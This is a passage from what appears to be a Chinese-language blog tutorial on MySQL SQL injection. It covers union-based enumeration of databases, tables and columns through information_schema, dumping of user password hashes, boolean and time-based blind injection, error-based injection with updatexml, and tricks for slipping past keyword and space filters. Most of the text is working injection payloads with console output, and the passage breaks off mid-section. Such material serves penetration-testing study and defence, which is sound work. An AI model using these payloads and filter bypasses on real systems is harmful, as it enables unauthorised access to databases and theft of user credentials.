<h6 id="2）第二步，判断页面回显数据的字段位置。"><a href="#2）第二步，判断页面回显数据的字段位置。" class="headerlink" title="2）第二步，判断页面回显数据的字段位置。"></a>2）第二步，判断页面回显数据的字段位置。</h6><h6 id="使用and-union-select-1-2-3-4-x-我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。"><a href="#使用and-union-select-1-2-3-4-x-我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。" class="headerlink" title="使用and union select 1,2,3,4,x...我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。"></a>使用<code>and union select 1,2,3,4,x...</code>我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。</h6><h6 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h6><ul>
<li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的<code>select</code>查询条件返回结果为空即可。</li>
<li>注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条<code>select</code>语句的方法之一。</li>
</ul>
<h6 id="3-第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。"><a href="#3-第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。" class="headerlink" title="3) 第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。"></a>3) 第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。</h6><h6 id="首先，查询当前数据库名database-、数据库账号user-、数据库版本version-等基本情况，再根据不同的版本、不同的权限确定接下来的方法。"><a href="#首先，查询当前数据库名database-、数据库账号user-、数据库版本version-等基本情况，再根据不同的版本、不同的权限确定接下来的方法。" class="headerlink" title="首先，查询当前数据库名database()、数据库账号user()、数据库版本version()等基本情况，再根据不同的版本、不同的权限确定接下来的方法。"></a>首先，查询当前数据库名database()、数据库账号user()、数据库版本version()等基本情况，再根据不同的版本、不同的权限确定接下来的方法。</h6><h6 id="若Mysql版本-lt-5-0"><a href="#若Mysql版本-lt-5-0" class="headerlink" title="若Mysql版本&lt;5.0"></a><code>若Mysql版本&lt;5.0</code></h6><h6 id="简单的说，由于mysql的低版本缺乏系统库information-schema，故通常情况下，我们无法直接查询表名，字段-列-名等信息，这时候只能靠猜来解决。"><a href="#简单的说，由于mysql的低版本缺乏系统库information-schema，故通常情况下，我们无法直接查询表名，字段-列-名等信息，这时候只能靠猜来解决。" class="headerlink" title="简单的说，由于mysql的低版本缺乏系统库information_schema，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠猜来解决。"></a>简单的说，由于mysql的低版本缺乏系统库information_schema，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠猜来解决。</h6><h6 id="直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。"><a href="#直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。" class="headerlink" title="直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。"></a>直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。</h6><h6 id="若知道仅表名而不知道列-字段-名："><a href="#若知道仅表名而不知道列-字段-名：" class="headerlink" title="若知道仅表名而不知道列(字段)名："></a>若知道仅表名而不知道列(字段)名：</h6><h6 id="可通过以下payload："><a href="#可通过以下payload：" class="headerlink" title="可通过以下payload："></a>可通过以下payload：</h6><ul>
<li>若多字段：select <code>x</code> from(select 1,2,3,4,xxx from table_name union select * from table_name)a</li>
<li>若单字段：select *,1,2,xxx from table_name</li>
</ul>
<h6 id="若Mysql版本-gt-5-0"><a href="#若Mysql版本-gt-5-0" class="headerlink" title="若Mysql版本&gt;=5.0"></a><code>若Mysql版本&gt;=5.0</code></h6><h6 id="首先去一个名为information-schema的数据库里的shemata数据表查询全部数据库名。"><a href="#首先去一个名为information-schema的数据库里的shemata数据表查询全部数据库名。" class="headerlink" title="首先去一个名为information_schema的数据库里的shemata数据表查询全部数据库名。"></a>首先去一个名为<code>information_schema</code>的数据库里的<code>shemata</code>数据表查询全部数据库名。</h6><h6 id="若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。"><a href="#若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。" class="headerlink" title="若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。"></a>若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。</h6><h6 id="在information-schema的一个名为tables的数据表中存着全部的数据表信息。"><a href="#在information-schema的一个名为tables的数据表中存着全部的数据表信息。" class="headerlink" title="在information_schema的一个名为tables的数据表中存着全部的数据表信息。"></a>在<code>information_schema</code>的一个名为<code>tables</code>的数据表中存着全部的数据表信息。</h6><h6 id="其中，table-name字段保存其名称，table-schema保存其对应的数据库名。"><a href="#其中，table-name字段保存其名称，table-schema保存其对应的数据库名。" class="headerlink" title="其中，table_name字段保存其名称，table_schema保存其对应的数据库名。"></a>其中，<code>table_name</code>字段保存其名称，<code>table_schema</code>保存其对应的数据库名。</h6><h6 id="示例如下："><a href="#示例如下：" class="headerlink" title="示例如下："></a>示例如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,phone from users where u_id=&apos;4413&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();</span><br><span class="line">+----------+----------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">| username | password                         | phone                                                                    |</span><br><span class="line">+----------+----------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 | 789                                                                      |</span><br><span class="line">| 1        | 2                                | admin,cart,orderp,orders,product_sku,product_spu,product_type,test,users |</span><br><span class="line">+----------+----------------------------------+--------------------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="上述payload可查看全部的数据表名，其中group-concat函数将多行数据转成一行数据。"><a href="#上述payload可查看全部的数据表名，其中group-concat函数将多行数据转成一行数据。" class="headerlink" title="上述payload可查看全部的数据表名，其中group_concat函数将多行数据转成一行数据。"></a>上述payload可查看全部的数据表名，其中<code>group_concat</code>函数将多行数据转成一行数据。</h6><h6 id="接着通过其表名，查询该表的所有字段名，有时也称列名。"><a href="#接着通过其表名，查询该表的所有字段名，有时也称列名。" class="headerlink" title="接着通过其表名，查询该表的所有字段名，有时也称列名。"></a>接着通过其表名，查询该表的所有字段名，有时也称列名。</h6><h6 id="通过information-schema库下的columns表可查询对应的数据库-数据库表含有的字段名。"><a href="#通过information-schema库下的columns表可查询对应的数据库-数据库表含有的字段名。" class="headerlink" title="通过information_schema库下的columns表可查询对应的数据库/数据库表含有的字段名。"></a>通过<code>information_schema</code>库下的<code>columns</code>表可查询对应的数据库/数据库表含有的字段名。</h6><h6 id="示例如下：-1"><a href="#示例如下：-1" class="headerlink" title="示例如下："></a>示例如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password,phone from users where u_id=&apos;4413&apos; union select 1,2,group_concat(table_name) from information_schema.columns where table_schema=database() and table_name=(table_name); #此处的表名为字符串型，也通过十六进制表示</span><br></pre></td></tr></table></figure>

<h6 id="知道了想要的数据存放的数据库，数据表，直接联合查询，payload如下："><a href="#知道了想要的数据存放的数据库，数据表，直接联合查询，payload如下：" class="headerlink" title="知道了想要的数据存放的数据库，数据表，直接联合查询，payload如下："></a>知道了想要的数据存放的数据库，数据表，直接联合查询，payload如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and union select 1,2,column_name,4,xxx from (database_name.)table_name</span><br></pre></td></tr></table></figure>

<h6 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,phone from users where u_id=&apos;4413&apos; union select 1,2,password from shopping1.users;</span><br><span class="line">+----------+----------------------------------+----------------------------------+</span><br><span class="line">| username | password                         | phone                            |</span><br><span class="line">+----------+----------------------------------+----------------------------------+</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 | 789                              |</span><br><span class="line">| 1        | 2                                | 123                              |</span><br><span class="line">| 1        | 2                                | 456                              |</span><br><span class="line">| 1        | 2                                | 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">+----------+----------------------------------+----------------------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="简单的说就是，查库名-gt-查表名-gt-查字段名-gt-查数据。"><a href="#简单的说就是，查库名-gt-查表名-gt-查字段名-gt-查数据。" class="headerlink" title="简单的说就是，查库名-&gt;查表名-&gt;查字段名-&gt;查数据。"></a>简单的说就是，<code>查库名-&gt;查表名-&gt;查字段名-&gt;查数据</code>。</h6><h5 id="4-盲注步骤"><a href="#4-盲注步骤" class="headerlink" title="4.盲注步骤"></a>4.盲注步骤</h5><h6 id="核心：利用逻辑代数连接词-条件函数，让页面返回的内容-响应时间与正常的页面不符。"><a href="#核心：利用逻辑代数连接词-条件函数，让页面返回的内容-响应时间与正常的页面不符。" class="headerlink" title="核心：利用逻辑代数连接词/条件函数，让页面返回的内容/响应时间与正常的页面不符。"></a>核心：利用<code>逻辑代数连接词/条件函数</code>，让页面<code>返回的内容/响应时间</code>与正常的页面不符。</h6><h6 id="bool盲注-1"><a href="#bool盲注-1" class="headerlink" title="bool盲注"></a><code>bool盲注</code></h6><h6 id="首先通过页面对于永真条件or-1-1与永假条件and-1-2的返回内容是否存在差异进行判断是否可以进行布尔盲注。"><a href="#首先通过页面对于永真条件or-1-1与永假条件and-1-2的返回内容是否存在差异进行判断是否可以进行布尔盲注。" class="headerlink" title="首先通过页面对于永真条件or 1=1与永假条件and 1=2的返回内容是否存在差异进行判断是否可以进行布尔盲注。"></a>首先通过页面对于永真条件<code>or 1=1</code>与永假条件<code>and 1=2</code>的返回内容是否存在差异进行判断是否可以进行布尔盲注。</h6><h6 id="如：select-from-users-where-username-username，其作用设定为判断用户名是否存在。"><a href="#如：select-from-users-where-username-username，其作用设定为判断用户名是否存在。" class="headerlink" title="如：select * from users where username=$username，其作用设定为判断用户名是否存在。"></a>如：<code>select * from users where username=$username</code>，其作用设定为判断用户名是否存在。</h6><h6 id="通常仅返回存在-不存在，两个结果。"><a href="#通常仅返回存在-不存在，两个结果。" class="headerlink" title="通常仅返回存在/不存在，两个结果。"></a>通常仅返回<code>存在/不存在</code>，两个结果。</h6><h6 id="这时候我们就不能使用联合查询法注入，因为页面不显示SQL语句返回的内容，只能使用盲注法-报错注入法来注出数据。"><a href="#这时候我们就不能使用联合查询法注入，因为页面不显示SQL语句返回的内容，只能使用盲注法-报错注入法来注出数据。" class="headerlink" title="这时候我们就不能使用联合查询法注入，因为页面不显示SQL语句返回的内容，只能使用盲注法/报错注入法来注出数据。"></a>这时候我们就不能使用联合查询法注入，因为页面不显示SQL语句返回的内容，只能使用<code>盲注法/报错注入法</code>来注出数据。</h6><h6 id="我们在将语句注入成：select-from-users-where-username-username-or-condition"><a href="#我们在将语句注入成：select-from-users-where-username-username-or-condition" class="headerlink" title="我们在将语句注入成：select * from users where username=$username or (condition)"></a>我们在将语句注入成：<code>select * from users where username=$username or (condition)</code></h6><h6 id="若后边拼接的条件为真的话，那么整条语句的where区域将变成永真条件。"><a href="#若后边拼接的条件为真的话，那么整条语句的where区域将变成永真条件。" class="headerlink" title="若后边拼接的条件为真的话，那么整条语句的where区域将变成永真条件。"></a>若后边拼接的条件为真的话，那么整条语句的where区域将变成<code>永真</code>条件。</h6><h6 id="那么，即使我们在-username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。"><a href="#那么，即使我们在-username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。" class="headerlink" title="那么，即使我们在$username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。"></a>那么，即使我们在$username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。</h6><h6 id="利用这一特性，我们的condition为：length-database-gt-8-即可用于判断数据库名长度"><a href="#利用这一特性，我们的condition为：length-database-gt-8-即可用于判断数据库名长度" class="headerlink" title="利用这一特性，我们的condition为：length(database())&gt;8 即可用于判断数据库名长度"></a>利用这一特性，我们的condition为：<code>length(database())&gt;8</code> 即可用于判断数据库名长度</h6><h6 id="除此之外，还可：ascii-substr-database-1-1-lt-130-用二分法快速获取数据名-逐字判断"><a href="#除此之外，还可：ascii-substr-database-1-1-lt-130-用二分法快速获取数据名-逐字判断" class="headerlink" title="除此之外，还可：ascii(substr(database(),1,1))&lt;130 用二分法快速获取数据名(逐字判断)"></a>除此之外，还可：ascii(substr(database(),1,1))&lt;130 用二分法快速获取数据名(逐字判断)</h6><h6 id="payload如下："><a href="#payload如下：" class="headerlink" title="payload如下："></a>payload如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=nouser or length(database())&gt;8</span><br><span class="line">select * from users where username=nouser or ascii(substr(database(),1,1))&lt;130</span><br></pre></td></tr></table></figure>

<h6 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password,phone from users where username=&apos;nouser&apos; or ascii(substr(database(),1,1))&gt;114;</span><br><span class="line">+----------+----------------------------------+-------+</span><br><span class="line">| username | password                         | phone |</span><br><span class="line">+----------+----------------------------------+-------+</span><br><span class="line">| user1    | 123                              | 124   |</span><br><span class="line">| user2    | 456                              | 568   |</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 | 789   |</span><br><span class="line">+----------+----------------------------------+-------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password,phone from users where username=&apos;nouser&apos; or length(database())&gt;8;</span><br><span class="line">+----------+----------------------------------+-------+</span><br><span class="line">| username | password                         | phone |</span><br><span class="line">+----------+----------------------------------+-------+</span><br><span class="line">| user1    | 123                              | 124   |</span><br><span class="line">| user2    | 456                              | 568   |</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 | 789   |</span><br><span class="line">+----------+----------------------------------+-------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password,phone from users where username=&apos;nouser&apos; or ascii(substr(database(),1,1))&gt;116;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password,phone from users where username=&apos;nouser&apos; or length(database())&gt;10;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a><code>时间盲注</code></h6><h6 id="通过判断页面返回内容的响应时间差异进行条件判断。"><a href="#通过判断页面返回内容的响应时间差异进行条件判断。" class="headerlink" title="通过判断页面返回内容的响应时间差异进行条件判断。"></a>通过判断页面<code>返回内容的响应时间差异</code>进行条件判断。</h6><h6 id="通常可利用的产生时间延迟的函数有：sleep-、benchmark-，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET-LOCK双SESSION产生延迟等方法。"><a href="#通常可利用的产生时间延迟的函数有：sleep-、benchmark-，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET-LOCK双SESSION产生延迟等方法。" class="headerlink" title="通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。"></a>通常可利用的产生时间延迟的函数有：<code>sleep()</code>、<code>benchmark()</code>，还有许多进行<code>复杂运算的函数</code>也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。</h6><h6 id="如上述例子：若服务器在执行永真-永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。"><a href="#如上述例子：若服务器在执行永真-永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。" class="headerlink" title="如上述例子：若服务器在执行永真/永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。"></a>如上述例子：若服务器在执行永真/永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。</h6><h6 id="在上述语句中，我们拼接语句，变成："><a href="#在上述语句中，我们拼接语句，变成：" class="headerlink" title="在上述语句中，我们拼接语句，变成："></a>在上述语句中，我们拼接语句，变成：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=$username (and | or) if(length(database())&gt;8,sleep(3),1)</span><br></pre></td></tr></table></figure>

<h6 id="例如：-1"><a href="#例如：-1" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; and if(length(database())&gt;8,sleep(3),1);</span><br><span class="line">Empty set (3.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; and if(length(database())&gt;10,sleep(3),1);</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| username | password                         |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="如果数据库名的长度大于8，那么if条件将执行sleep-3-，那么此条语句将进行延迟3秒的操作。"><a href="#如果数据库名的长度大于8，那么if条件将执行sleep-3-，那么此条语句将进行延迟3秒的操作。" class="headerlink" title="如果数据库名的长度大于8，那么if条件将执行sleep(3)，那么此条语句将进行延迟3秒的操作。"></a>如果数据库名的长度大于8，那么if条件将执行sleep(3)，那么此条语句将进行延迟3秒的操作。</h6><h6 id="若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。"><a href="#若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。" class="headerlink" title="若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。"></a>若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。</h6><h5 id="5-报错注入步骤"><a href="#5-报错注入步骤" class="headerlink" title="5.报错注入步骤"></a>5.报错注入步骤</h5><h6 id="通过特殊函数的错误使用使其参数被页面输出。"><a href="#通过特殊函数的错误使用使其参数被页面输出。" class="headerlink" title="通过特殊函数的错误使用使其参数被页面输出。"></a>通过<code>特殊函数</code>的错误使用使其参数被页面输出。</h6><h6 id="前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。"><a href="#前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。" class="headerlink" title="前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。"></a>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。</h6><h6 id="常见的利用函数有：exp-、floor-rand-、updatexml-、extractvalue-等"><a href="#常见的利用函数有：exp-、floor-rand-、updatexml-、extractvalue-等" class="headerlink" title="常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等"></a>常见的利用函数有：<code>exp()、floor()+rand()、updatexml()、extractvalue()</code>等</h6><h6 id="如：select-from-users-where-username-username-and-or-updatexml-1-concat-0x7e-select-user-0x7e-1-。"><a href="#如：select-from-users-where-username-username-and-or-updatexml-1-concat-0x7e-select-user-0x7e-1-。" class="headerlink" title="如：select * from users where username=$username (and | or) updatexml(1,concat(0x7e,(select user()),0x7e),1)。"></a>如：<code>select * from users where username=$username (and | or) updatexml(1,concat(0x7e,(select user()),0x7e),1)</code>。</h6><h6 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;</span><br></pre></td></tr></table></figure>

<h6 id="因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符-，使其不满足xpath格式，进行报错并输出。"><a href="#因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符-，使其不满足xpath格式，进行报错并输出。" class="headerlink" title="因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符~，使其不满足xpath格式，进行报错并输出。"></a>因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符~，使其不满足xpath格式，进行报错并输出。</h6><h6 id="将上述payload的-select-user-当做联合查询法的注入位置，接下来的操作与联合查询法一样。"><a href="#将上述payload的-select-user-当做联合查询法的注入位置，接下来的操作与联合查询法一样。" class="headerlink" title="将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。"></a>将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。</h6><h6 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h6><ul>
<li>报错函数通常尤其最长报错输出的限制，面对这种情况，可以进行分割输出。</li>
<li>特殊函数的特殊参数进运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。</li>
</ul>
<h4 id="0x03-增、删、改"><a href="#0x03-增、删、改" class="headerlink" title="0x03.增、删、改"></a>0x03.增、删、改</h4><h6 id="可简单当做无回显的Select语句进行注入。值得注意的是，通常增insert处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。"><a href="#可简单当做无回显的Select语句进行注入。值得注意的是，通常增insert处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。" class="headerlink" title="可简单当做无回显的Select语句进行注入。值得注意的是，通常增insert处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。"></a>可简单当做无回显的Select语句进行注入。值得注意的是，通常增insert处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。</h6><h3 id="Mysql注入-进阶"><a href="#Mysql注入-进阶" class="headerlink" title="Mysql注入-进阶"></a>Mysql注入-进阶</h3><h4 id="0x04-常见的防御手段绕过"><a href="#0x04-常见的防御手段绕过" class="headerlink" title="0x04.常见的防御手段绕过"></a>0x04.常见的防御手段绕过</h4><h6 id="在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。"><a href="#在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。" class="headerlink" title="在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。"></a>在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。</h6><h6 id="简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。"><a href="#简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。" class="headerlink" title="简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。"></a>简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。</h6><h6 id="若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。"><a href="#若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。" class="headerlink" title="若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。"></a>若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。</h6><h6 id="举个例子：程序过滤掉了union这一关键词，我们可以使用ununionion来绕过。"><a href="#举个例子：程序过滤掉了union这一关键词，我们可以使用ununionion来绕过。" class="headerlink" title="举个例子：程序过滤掉了union这一关键词，我们可以使用ununionion来绕过。"></a>举个例子：程序过滤掉了<code>union</code>这一关键词，我们可以使用<code>ununionion</code>来绕过。</h6><h6 id="PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。"><a href="#PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。" class="headerlink" title="PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。"></a>PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。</h6><h5 id="2-and-or-被过滤-拦截"><a href="#2-and-or-被过滤-拦截" class="headerlink" title="2.and/or 被过滤/拦截"></a>2.and/or 被过滤/拦截</h5><ul>
<li>双写<code>anandd、oorr</code></li>
<li>使用运算符代替<code>&amp;&amp;、||</code></li>
<li>直接拼接=号，如：<code>?id=1=(condition)</code></li>
<li>其他方法，如：<code>?id=1^(condition)</code></li>
</ul>
<h5 id="3-空格被过滤-拦截"><a href="#3-空格被过滤-拦截" class="headerlink" title="3.空格被过滤/拦截"></a>3.空格被过滤/拦截</h5><ul>
<li>多层括号嵌套</li>
<li>改用+号</li>
<li>使用注释代替</li>
<li><code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略</li>
<li><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格</li>
</ul>
<h6 id="如：select-from-user-where-username-39-admin-39-union-select-title-content-from-article-where-id-39-1-39-and-1-1"><a href="#如：select-from-user-where-username-39-admin-39-union-select-title-content-from-article-where-id-39-1-39-and-1-1" class="headerlink" title="如：select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)"></a>如：<code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></h6><h6 id="例如：-2"><a href="#例如：-2" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where u_id=&apos;4413&apos;union(select+username,password/**/from/*!users*/where/**/u_id=&apos;4412&apos;and!!!!~~1=1);</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| username | password                         |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| admin    | 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">| user2    | 456                              |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">2 rows in set, 2 warnings (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="4-括号被过滤-拦截"><a href="#4-括号被过滤-拦截" class="headerlink" title="4.括号被过滤/拦截"></a>4.括号被过滤/拦截</h5><ul>
